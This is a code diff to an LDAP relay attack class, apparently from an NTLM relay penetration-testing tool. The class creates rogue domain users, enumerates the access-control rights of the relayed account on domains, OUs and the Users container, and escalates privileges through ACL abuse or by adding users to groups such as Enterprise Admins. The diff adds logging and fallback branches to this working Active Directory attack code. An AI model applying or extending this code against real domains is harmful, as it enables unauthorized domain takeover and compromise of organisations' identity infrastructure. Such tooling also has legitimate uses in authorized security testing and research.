@@ -81,7 +81,7 @@ class LDAPAttack(ProtocolAttack):
             'sAMAccountName': newUser,
             'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
         }
-
+        LOG.info('Attempting to create user in: %s' % parent)
         res = self.client.add(newUserDn, ['top','person','organizationalPerson','user'], ucd)
         if not res:
             # Adding users requires LDAPS
@@ -92,6 +92,7 @@ class LDAPAttack(ProtocolAttack):
             return False
         else:
             LOG.info('Adding new user with username: %s and password: %s result: OK' % (newUser, newPassword))
+
             # Return the DN
             return newUserDn
 
@@ -184,9 +185,13 @@ class LDAPAttack(ProtocolAttack):
         sidmapping[group['objectSid'].value] = group.entry_dn
         membersids.append(group['objectSid'].value)
         controls = security_descriptor_control(sdflags=0x05) # Query Owner and Dacl
-        # Now we have all the SIDs applicable to this user, now enumerate the privileges
-        entries = self.client.extend.standard.paged_search(domainDumper.root, '(|(objectClass=domain)(objectClass=container)(objectClass=organizationalUnit))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
+        # Now we have all the SIDs applicable to this user, now enumerate the privileges of domains and OUs
+        entries = self.client.extend.standard.paged_search(domainDumper.root, '(|(objectClass=domain)(objectClass=organizationalUnit))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
         self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)
+        # Also get the privileges on the default Users container
+        entries = self.client.extend.standard.paged_search(domainDumper.root, '(&(cn=Users)(objectClass=container))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
+        self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)
+
         # Interesting groups we'd like to be a member of, in order of preference
         interestingGroups = [
             '%s-%d' % (domainsid, 519), # Enterprise admins
@@ -304,6 +309,7 @@ class LDAPAttack(ProtocolAttack):
 
         # Create new dumper object
         domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
+        LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
         userSid, privs = self.validatePrivileges(self.username, domainDumper)
         if privs['create']:
             LOG.info('User privileges found: Create user')
@@ -327,7 +333,7 @@ class LDAPAttack(ProtocolAttack):
                 # Perform the ACL attack
                 self.aclAttack(userDn, domainDumper)
                 return
-            else:
+            elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
@@ -336,6 +342,9 @@ class LDAPAttack(ProtocolAttack):
                 # Perform the ACL attack
                 self.aclAttack(userDn, domainDumper)
                 return
+            else:
+                LOG.error('Cannot perform ACL escalation because we do not have create user '\
+                    'privileges. Specify a user to assign privileges to with --escalate-user')
 
         # If we can't ACL escalate, try adding us to a privileged group
         if self.config.addda and privs['escalateViaGroup']:
@@ -351,7 +360,7 @@ class LDAPAttack(ProtocolAttack):
                 # Perform the Group attack
                 self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
                 return
-            else:
+            elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
@@ -360,6 +369,9 @@ class LDAPAttack(ProtocolAttack):
                 # Perform the Group attack
                 self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
                 return
+            else:
+                LOG.error('Cannot perform ACL escalation because we do not have create user '\
+                    'privileges. Specify a user to assign privileges to with --escalate-user')
 
         # Last attack, dump the domain if no special privileges are present
         if not dumpedDomain and self.config.dumpdomain:
